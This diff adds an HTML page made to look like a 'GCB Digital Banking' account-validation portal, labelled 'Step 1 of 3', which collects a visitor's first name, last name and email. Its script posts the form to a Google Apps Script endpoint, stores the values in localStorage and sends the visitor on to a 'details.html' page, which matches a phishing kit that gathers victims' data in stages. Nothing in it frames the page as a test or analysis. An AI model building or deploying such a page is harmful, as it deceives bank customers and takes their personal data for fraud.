@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>GCB Digital Banking | Account Validation</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+  :root {
+    --primary: #0b3a66;
+    --primary-dark: #082c4d;
+    --accent: #ffcc00;
+    --bg: #f3f5f8;
+    --card-bg: #ffffff;
+    --text-main: #1f2933;
+    --text-muted: #6b7280;
+    --border: #e5e7eb;
+  }
+
+  * { box-sizing: border-box; }
+
+  body {
+    margin: 0;
+    min-height: 100vh;
+    font-family: "Inter", system-ui, sans-serif;
+    background: var(--bg);
+    color: var(--text-main);
+    display: flex;
+    flex-direction: column;
+    opacity: 0;
+    transition: opacity 0.5s ease;
+  }
+
+  body.fade-in { opacity: 1; }
+  body.fade-out { opacity: 0; }
+
+  /* ===== HEADER ===== */
+  header {
+    background: linear-gradient(180deg, var(--primary), var(--primary-dark));
+    color: #fff;
+    padding: 16px 0;
+    box-shadow: 0 4px 18px rgba(0,0,0,0.25);
+  }
+
+  .header-inner {
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 0 20px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+
+  .brand {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .logo {
+    width: 42px;
+    height: 42px;
+    border-radius: 50%;
+    background: var(--accent);
+    display: grid;
+    place-items: center;
+    font-weight: 800;
+    color: var(--primary);
+    font-size: 15px;
+  }
+
+  .brand-text strong {
+    font-size: 15px;
+    letter-spacing: 0.4px;
+  }
+
+  .brand-text span {
+    font-size: 12px;
+    opacity: 0.85;
+  }
+
+  .secure-badge {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 13px;
+    background: rgba(255,255,255,0.12);
+    padding: 8px 14px;
+    border-radius: 999px;
+  }
+
+  .secure-dot {
+    width: 8px;
+    height: 8px;
+    background: #22c55e;
+    border-radius: 50%;
+  }
+
+  /* ===== MAIN ===== */
+  main {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 40px 20px;
+  }
+
+  .portal-card {
+    width: 100%;
+    max-width: 480px;
+    background: var(--card-bg);
+    border-radius: 14px;
+    border: 1px solid var(--border);
+    box-shadow: 0 12px 30px rgba(0,0,0,0.12);
+    overflow: hidden;
+    animation: fadeIn 0.5s ease;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(10px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .card-header {
+    padding: 22px 26px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .card-header h1 {
+    margin: 0;
+    font-size: 18px;
+    font-weight: 700;
+  }
+
+  .card-header p {
+    margin-top: 6px;
+    font-size: 13px;
+    color: var(--text-muted);
+  }
+
+  .card-body {
+    padding: 26px;
+  }
+
+  label {
+    display: block;
+    font-size: 13px;
+    font-weight: 600;
+    margin-bottom: 6px;
+  }
+
+  input {
+    width: 100%;
+    padding: 12px 14px;
+    margin-bottom: 18px;
+    font-size: 14px;
+    border-radius: 8px;
+    border: 1px solid var(--border);
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+
+  input:focus {
+    outline: none;
+    border-color: var(--primary);
+    box-shadow: 0 0 0 3px rgba(11,58,102,0.15);
+  }
+
+  .btn {
+    width: 100%;
+    padding: 14px;
+    border-radius: 10px;
+    border: none;
+    background: var(--primary);
+    color: #fff;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background 0.2s, box-shadow 0.2s, transform 0.1s;
+    box-shadow: 0 6px 16px rgba(0,0,0,0.18);
+  }
+
+  .btn:hover { background: var(--primary-dark); }
+  .btn:active { transform: translateY(1px); }
+
+  footer {
+    padding: 18px;
+    text-align: center;
+    font-size: 12px;
+    color: var(--text-muted);
+  }
+
+  /* ===== OVERLAY ===== */
+  .overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.45);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    color: #fff;
+    font-size: 15px;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.3s ease;
+    z-index: 999;
+  }
+
+  .overlay.active {
+    opacity: 1;
+    pointer-events: all;
+  }
+
+  .spinner {
+    width: 44px;
+    height: 44px;
+    border: 4px solid rgba(255,255,255,0.35);
+    border-top: 4px solid var(--accent);
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-bottom: 16px;
+  }
+
+  @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+
+<body>
+<script>document.body.classList.add("fade-in");</script>
+
+<!-- HEADER -->
+<header>
+  <div class="header-inner">
+    <div class="brand">
+      <div class="logo">GCB</div>
+      <div class="brand-text">
+        <strong>GCB Digital Banking</strong><br>
+        <span>Secure Client Portal</span>
+      </div>
+    </div>
+    <div class="secure-badge">
+      <div class="secure-dot"></div>
+      Secure Session
+    </div>
+  </div>
+</header>
+
+<!-- MAIN -->
+<main>
+  <div class="portal-card">
+    <div class="card-header">
+      <h1>Account Validation</h1>
+      <p>Step 1 of 3 — Confirm your personal information.</p>
+    </div>
+
+    <div class="card-body">
+      <form id="dataForm" autocomplete="off">
+        <label>First Name</label>
+        <input type="text" name="firstName" placeholder="Enter your first name" required />
+
+        <label>Last Name</label>
+        <input type="text" name="lastName" placeholder="Enter your last name" required />
+
+        <label>Email Address</label>
+        <input type="email" name="email" placeholder="Enter your email address" required />
+
+        <button class="btn" type="submit">Continue Securely</button>
+      </form>
+    </div>
+  </div>
+</main>
+
+<!-- FOOTER -->
+<footer>
+  © 2026 GCB Bank PLC. All rights reserved.
+</footer>
+
+<!-- OVERLAY -->
+<div class="overlay" id="overlay">
+  <div class="spinner"></div>
+  Processing your request…
+</div>
+
+<script>
+  const scriptURL = "https://script.google.com/macros/s/AKfycbxna9EgM4s8zbNQTkfzcHfADid6CE7MEMmXAAIX2RTU6YfT-GkHRxEIWPVa81Qt-oO0/exec";
+  const form = document.getElementById("dataForm");
+  const overlay = document.getElementById("overlay");
+
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+    overlay.classList.add("active");
+
+    const formData = new FormData(form);
+    const data = Object.fromEntries(formData.entries());
+
+    try {
+      await fetch(scriptURL, {
+        method: "POST",
+        body: formData
+      });
+
+      localStorage.setItem("firstName", data.firstName || "");
+      localStorage.setItem("lastName", data.lastName || "");
+      localStorage.setItem("email", data.email || "");
+
+      setTimeout(() => {
+        document.body.classList.add("fade-out");
+        setTimeout(() => {
+          window.location.href = "details.html";
+        }, 500);
+      }, 1200);
+
+    } catch (err) {
+      overlay.classList.remove("active");
+      alert("Something went wrong. Please try again.");
+    }
+  });
+</script>
+
+</body>
+</html>
